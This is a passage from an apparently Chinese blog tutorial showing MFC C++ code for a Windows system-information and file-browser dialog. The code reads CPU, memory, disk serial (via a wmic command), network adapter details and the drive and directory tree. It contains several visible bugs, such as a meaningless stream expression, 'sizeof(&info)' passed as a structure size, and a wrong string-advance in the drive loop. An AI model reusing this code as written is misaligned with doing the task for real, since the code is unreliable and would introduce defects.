class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">DWORD deax;</span><br><span class="line">DWORD debx;</span><br><span class="line">DWORD decx;</span><br><span class="line">DWORD dedx;</span><br><span class="line"><span class="comment">// 使用汇编初始化CPU</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::initCpu</span><span class="params">(DWORD veax)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, veax</span><br><span class="line">cpuid</span><br><span class="line">mov deax, eax</span><br><span class="line">mov debx, ebx</span><br><span class="line">mov decx, ecx</span><br><span class="line">mov dedx, edx</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//频率</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">DiySystemInfo::getCpuFreq</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> start, over;</span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">RDTSC</span><br><span class="line">mov start, eax</span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">50</span>);</span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">RDTSC</span><br><span class="line">mov over, eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (over - start) / <span class="number">50000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//制造商</span></span><br><span class="line"><span class="function">CString <span class="title">DiySystemInfo::getManufactureID</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> manuID[<span class="number">25</span>];</span><br><span class="line"><span class="built_in">memset</span>(manuID, <span class="number">0</span>, <span class="keyword">sizeof</span>(manuID));</span><br><span class="line"></span><br><span class="line">initCpu(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(manuID + <span class="number">0</span>, &amp;debx, <span class="number">4</span>); </span><br><span class="line"><span class="built_in">memcpy</span>(manuID + <span class="number">4</span>, &amp;dedx, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(manuID + <span class="number">8</span>, &amp;decx, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">CString cs;</span><br><span class="line">cs.Format(<span class="string">L&quot;%S&quot;</span>, manuID);</span><br><span class="line"><span class="keyword">return</span> cs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//CPU的类型</span></span><br><span class="line"><span class="function">CString <span class="title">DiySystemInfo::getCpuType</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> DWORD id = <span class="number">0x80000002</span>; <span class="comment">// start 0x80000002 end to 0x80000004</span></span><br><span class="line"><span class="keyword">char</span> cpuType[<span class="number">49</span>];</span><br><span class="line"><span class="built_in">memset</span>(cpuType, <span class="number">0</span>, <span class="keyword">sizeof</span>(cpuType));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (DWORD t = <span class="number">0</span>; t &lt; <span class="number">3</span>; t++)</span><br><span class="line">&#123;</span><br><span class="line">initCpu(id + t);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cpuType + <span class="number">16</span> * t + <span class="number">0</span>, &amp;deax, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(cpuType + <span class="number">16</span> * t + <span class="number">4</span>, &amp;debx, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(cpuType + <span class="number">16</span> * t + <span class="number">8</span>, &amp;decx, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(cpuType + <span class="number">16</span> * t + <span class="number">12</span>, &amp;dedx, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line">CString cs;</span><br><span class="line">cs.Format(<span class="string">L&quot;%S&quot;</span>, cpuType);</span><br><span class="line"><span class="keyword">return</span> cs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//CPU的调用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::getCpuInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_SystemInfo.CPU_FREQUENCY = getCpuFreq();</span><br><span class="line">m_SystemInfo.CPU_MANUFACTURE = getManufactureID();</span><br><span class="line">m_SystemInfo.CPU_TYPE = getCpuType();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取存信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::getMemoryInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> memory_info;</span><br><span class="line">MEMORYSTATUSEX statusex;</span><br><span class="line">statusex.dwLength = <span class="keyword">sizeof</span>(statusex);</span><br><span class="line"><span class="keyword">if</span> (GlobalMemoryStatusEx(&amp;statusex))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> total = <span class="number">0</span>, remain_total = <span class="number">0</span>, avl = <span class="number">0</span>, remain_avl = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> decimal_total = <span class="number">0</span>, decimal_avl = <span class="number">0</span>;</span><br><span class="line">remain_total = statusex.ullTotalPhys % GBYTES;</span><br><span class="line">total = statusex.ullTotalPhys / GBYTES;</span><br><span class="line">avl = statusex.ullAvailPhys / GBYTES;</span><br><span class="line">remain_avl = statusex.ullAvailPhys % GBYTES;</span><br><span class="line"><span class="keyword">if</span> (remain_total &gt; <span class="number">0</span>)</span><br><span class="line">decimal_total = (remain_total / MBYTES) / DKBYTES;</span><br><span class="line"><span class="keyword">if</span> (remain_avl &gt; <span class="number">0</span>)</span><br><span class="line">decimal_avl = (remain_avl / MBYTES) / DKBYTES;</span><br><span class="line"></span><br><span class="line">decimal_total += (<span class="keyword">double</span>)total;</span><br><span class="line">decimal_avl += (<span class="keyword">double</span>)avl;</span><br><span class="line"><span class="keyword">char</span>  buffer[kMaxInfoBuffer];</span><br><span class="line">sprintf_s(buffer, kMaxInfoBuffer, <span class="string">&quot;total %.2f GB (%.2f GB available)&quot;</span>, decimal_total, decimal_avl);</span><br><span class="line">memory_info.append(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">m_SystemInfo.MEMORY_INFO.Format(<span class="string">L&quot;%S&quot;</span>,memory_info.c_str());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">CString <span class="title">DiySystemInfo::execCmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">CString result;</span><br><span class="line">FILE* pipe = _popen(cmd, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pipe) <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">&quot;_popen() failed!&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof(pipe))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fgets(buffer, <span class="number">128</span>, pipe) != <span class="literal">NULL</span>)</span><br><span class="line">result += buffer;</span><br><span class="line">&#125;</span><br><span class="line">_pclose(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取序列号</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::getHardDiskInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString hd_seiral = execCmd(<span class="string">&quot;wmic path win32_physicalmedia get SerialNumber&quot;</span>);</span><br><span class="line"></span><br><span class="line">m_SystemInfo.HardDisk = hd_seiral;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取网卡信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::getNetworkInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIP_ADAPTER_INFO pIpAdapterInfo = <span class="keyword">new</span> IP_ADAPTER_INFO();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> adapter_size = <span class="keyword">sizeof</span>(IP_ADAPTER_INFO);</span><br><span class="line"><span class="keyword">int</span> ret = GetAdaptersInfo(pIpAdapterInfo, &amp;adapter_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret == ERROR_BUFFER_OVERFLOW)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> pIpAdapterInfo;</span><br><span class="line">pIpAdapterInfo = (PIP_ADAPTER_INFO)<span class="keyword">new</span> BYTE[adapter_size];</span><br><span class="line">ret = GetAdaptersInfo(pIpAdapterInfo, &amp;adapter_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret == ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> card_index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pIpAdapterInfo)</span><br><span class="line">&#123;</span><br><span class="line">pIpAdapterInfo-&gt;Description &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">m_SystemInfo.NET_CARD.Format(<span class="string">L&quot;%d&quot;</span>, ++card_index);</span><br><span class="line">m_SystemInfo.NET_CARD_NAME = pIpAdapterInfo-&gt;AdapterName;</span><br><span class="line">m_SystemInfo.NET_CARD_DECS = pIpAdapterInfo-&gt;Description;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIP_ADDR_STRING pIpAddr = &amp;(pIpAdapterInfo-&gt;IpAddressList);</span><br><span class="line"><span class="keyword">while</span> (pIpAddr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> local_ip[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(local_ip, pIpAddr-&gt;IpAddress.String);</span><br><span class="line"></span><br><span class="line">m_SystemInfo.NET_IP.Format(<span class="string">L&quot;%S&quot;</span>,local_ip);</span><br><span class="line">pIpAddr = pIpAddr-&gt;Next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> local_mac[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> char_index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pIpAdapterInfo-&gt;AddressLength; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp_str[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(temp_str, <span class="string">&quot;%02X-&quot;</span>, pIpAdapterInfo-&gt;Address[i]); </span><br><span class="line"><span class="built_in">strcpy</span>(local_mac + char_index, temp_str);</span><br><span class="line">char_index += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">local_mac[<span class="number">17</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_SystemInfo.NET_MAC.Format(<span class="string">L&quot;%S&quot;</span>,local_mac);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pIpAdapterInfo)</span><br><span class="line"><span class="keyword">delete</span> pIpAdapterInfo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程ID的获取 //</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::getProcessInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid = GetCurrentProcessId();</span><br><span class="line"></span><br><span class="line">m_SystemInfo.PID.Format(<span class="string">L&quot;Current Pid:%d&quot;</span>,pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对外调用的接口</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiySystemInfo::GetInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//系统信息</span></span><br><span class="line">getOsInfo();</span><br><span class="line"></span><br><span class="line"><span class="comment">//CPU信息</span></span><br><span class="line">getCpuInfo();</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存信息</span></span><br><span class="line">getMemoryInfo();</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列号</span></span><br><span class="line">getHardDiskInfo();</span><br><span class="line"></span><br><span class="line"><span class="comment">//网卡信息</span></span><br><span class="line">getNetworkInfo();</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程ID</span></span><br><span class="line">getProcessInfo();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用与输出"><a href="#调用与输出" class="headerlink" title="调用与输出"></a>调用与输出</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取系统信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyComputerDlg::GetSystemInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString cs;</span><br><span class="line">DiySystemInfo system;</span><br><span class="line">system.GetInfo();</span><br><span class="line">m_strOsName.SetString(system.m_SystemInfo.OS_NAME);</span><br><span class="line">m_strOsVersion.SetString(system.m_SystemInfo.OS_VERSION);</span><br><span class="line">cs.Format(<span class="string">L&quot;%dHZ&quot;</span>, system.m_SystemInfo.CPU_FREQUENCY);</span><br><span class="line">m_strCpuFre.SetString(cs);</span><br><span class="line">m_strCpuManuFac.SetString(system.m_SystemInfo.CPU_MANUFACTURE);</span><br><span class="line">m_strCpuType.SetString(system.m_SystemInfo.CPU_TYPE);</span><br><span class="line">m_strMemory.SetString(system.m_SystemInfo.MEMORY_INFO);</span><br><span class="line">m_strDisk.SetString(system.m_SystemInfo.HardDisk);</span><br><span class="line">m_strNetCard.SetString(system.m_SystemInfo.NET_CARD);</span><br><span class="line">m_strNetCardName.SetString(system.m_SystemInfo.NET_CARD_NAME);</span><br><span class="line">m_strNetCardDecs.SetString(system.m_SystemInfo.NET_CARD_DECS);</span><br><span class="line">m_strNetIp.SetString(system.m_SystemInfo.NET_IP);</span><br><span class="line">m_strNetMac.SetString(system.m_SystemInfo.NET_MAC);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="文件的遍历与树控件"><a href="#文件的遍历与树控件" class="headerlink" title="文件的遍历与树控件"></a>文件的遍历与树控件</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算机界面的初始化</span></span><br><span class="line"><span class="function">BOOL <span class="title">CMyComputerDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::OnInitDialog();</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化Tree控件风格</span></span><br><span class="line">DWORD dwStyle = GetWindowLong(m_objComTree.m_hWnd, GWL_STYLE);</span><br><span class="line">dwStyle |= TVS_HASBUTTONS | TVS_HASLINES | TVS_LINESATROOT;</span><br><span class="line">SetWindowLong(m_objComTree.m_hWnd, GWL_STYLE, dwStyle);</span><br><span class="line"></span><br><span class="line">m_objComList.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES );<span class="comment">//更改风格</span></span><br><span class="line"><span class="comment">// 添加列</span></span><br><span class="line">m_objComList.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;文件名&quot;</span>, <span class="number">0</span>, <span class="number">150</span>);</span><br><span class="line">m_objComList.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;类型&quot;</span>, <span class="number">0</span>, <span class="number">80</span>);</span><br><span class="line">m_objComList.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;大小&quot;</span>, <span class="number">0</span>, <span class="number">50</span>);</span><br><span class="line">m_objComList.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;修改日期&quot;</span>, <span class="number">0</span>, <span class="number">200</span>);</span><br><span class="line">m_objComList.InsertColumn(<span class="number">4</span>, <span class="string">L&quot;属性&quot;</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">m_objComList.InsertColumn(<span class="number">5</span>, <span class="string">L&quot;路径&quot;</span>, <span class="number">0</span>, <span class="number">200</span>);</span><br><span class="line"><span class="comment">//列表图片</span></span><br><span class="line">m_ImageList.Create(<span class="number">16</span>, <span class="number">16</span>, ILC_COLOR32, <span class="number">4</span>, <span class="number">1</span>);     <span class="comment">//创建图像序列CImageList对象 </span></span><br><span class="line">m_objComList.SetImageList(&amp;m_ImageList, LVSIL_SMALL);  <span class="comment">//为树形控件设置图像序列</span></span><br><span class="line"><span class="comment">//树控件图片</span></span><br><span class="line">m_DirImage.Create(<span class="number">16</span>, <span class="number">16</span>, ILC_COLOR32, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">CBitmap ComPuter;</span><br><span class="line">ComPuter.LoadBitmap(IDB_BITMAP3);</span><br><span class="line"><span class="comment">//m_ComputerImage</span></span><br><span class="line">m_DirImage.Add(&amp;ComPuter, RGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">m_Root = m_objComTree.InsertItem(<span class="string">L&quot;此电脑&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">//遍历磁盘</span></span><br><span class="line">GetDistHeadInfo();</span><br><span class="line"><span class="comment">//插入磁盘分区</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Disk.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line">SHFILEINFO info = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">CString temp = Disk[i]-&gt;csDiskHead;</span><br><span class="line">SHGetFileInfo(temp, <span class="number">0</span>, &amp;info, <span class="keyword">sizeof</span>(&amp;info), SHGFI_DISPLAYNAME | SHGFI_ICON);</span><br><span class="line"><span class="keyword">int</span> b = m_DirImage.Add(info.hIcon);</span><br><span class="line"><span class="comment">//Disk[i]-&gt;csDiskHead += Disk[i]-&gt;attribute;</span></span><br><span class="line">temp += Disk[i]-&gt;attribute;</span><br><span class="line">HTREEITEM hDiskHead = m_objComTree.InsertItem(Disk[i]-&gt;csDiskHead, b, b, m_Root);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">m_objComTree.SetImageList(&amp;m_DirImage, LVSIL_NORMAL);</span><br><span class="line"><span class="keyword">return</span> TRUE;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取分区盘符"><a href="#获取分区盘符" class="headerlink" title="获取分区盘符"></a>获取分区盘符</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历盘符</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyComputerDlg::GetDistHeadInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line"></span><br><span class="line">DWORD 总容量;</span><br><span class="line">DWORD 空闲容量;</span><br><span class="line">GetLogicalDriveStrings(<span class="number">100</span>, buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> Flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">MyDiskHeadInfo* pds = <span class="keyword">new</span> MyDiskHeadInfo;</span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = GetDriveType(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line"><span class="comment">//..ListView_SetItemText(hListCtrl, Flag, 1, (TCHAR*)_T(&quot;可移动设备&quot;));</span></span><br><span class="line">pds-&gt;attribute = <span class="string">L&quot;可移动设备&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line"><span class="comment">//ListView_SetItemText(hListCtrl, Flag, 1, (TCHAR*)_T(&quot;硬盘&quot;));</span></span><br><span class="line">pds-&gt;attribute = <span class="string">L&quot;硬盘&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line"><span class="comment">//ListView_SetItemText(hListCtrl, Flag, 1, (TCHAR*)_T(&quot;远程设备&quot;));</span></span><br><span class="line">pds-&gt;attribute = <span class="string">L&quot;远程设备&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line"><span class="comment">//ListView_SetItemText(hListCtrl, Flag, 1, (TCHAR*)_T(&quot;光驱&quot;));</span></span><br><span class="line">pds-&gt;attribute = <span class="string">L&quot;光驱&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line">GetDiskFreeSpace(pTemp,</span><br><span class="line">&amp;每簇的扇区数量,</span><br><span class="line">&amp;每个扇区的容量,</span><br><span class="line">&amp;空闲簇的总量,</span><br><span class="line">&amp;全部簇的总量</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">pds-&gt;uAllSize = (((全部簇的总量 / <span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量) / <span class="number">1024</span>) / <span class="number">1024</span>;</span><br><span class="line">pds-&gt;uAbouleSize = (((空闲簇的总量 / <span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量) / <span class="number">1024</span>) / <span class="number">1024</span>;</span><br><span class="line">pds-&gt;uUsed = pds-&gt;uAllSize - pds-&gt;uAbouleSize;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pds-&gt;csDiskHead = pTemp;</span><br><span class="line">Disk.push_back(pds);</span><br><span class="line">pTemp += wcslen(buf) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">Flag++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="添加目录"><a href="#添加目录" class="headerlink" title="添加目录"></a>添加目录</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加子目录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyComputerDlg::AddSubDir</span><span class="params">(HTREEITEM hParent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString strPath = GetFullPath(hParent);     <span class="comment">//获取全路径</span></span><br><span class="line"><span class="keyword">if</span> (strPath.Right(<span class="number">1</span>) != <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">strPath += <span class="string">&quot;\\&quot;</span>;</span><br><span class="line">strPath += <span class="string">&quot;*.*&quot;</span>;</span><br><span class="line">CFileFind file;</span><br><span class="line">BOOL bContinue = file.FindFile(strPath);    <span class="comment">//查找包含字符串的文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (bContinue)</span><br><span class="line">&#123;</span><br><span class="line">bContinue = file.FindNextFile();        <span class="comment">//查找下一个文件</span></span><br><span class="line"><span class="keyword">if</span> (file.IsDirectory() &amp;&amp; !file.IsDots())</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">SHFILEINFO info = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">CString temp = strPath;</span><br><span class="line"><span class="keyword">int</span> index = temp.Find(<span class="string">L&quot;*.*&quot;</span>);</span><br><span class="line">temp.Delete(index, <span class="number">3</span>);</span><br><span class="line">SHGetFileInfo(temp + file.GetFileName(), <span class="number">0</span>, &amp;info, <span class="keyword">sizeof</span>(&amp;info), SHGFI_DISPLAYNAME | SHGFI_ICON);</span><br><span class="line"><span class="keyword">int</span> i = m_DirImage.Add(info.hIcon);</span><br><span class="line"><span class="comment">//m_objComList.InsertItem(i, info.szDisplayName, i);</span></span><br><span class="line">m_objComTree.InsertItem(file.GetFileName(),i,i, hParent);</span><br><span 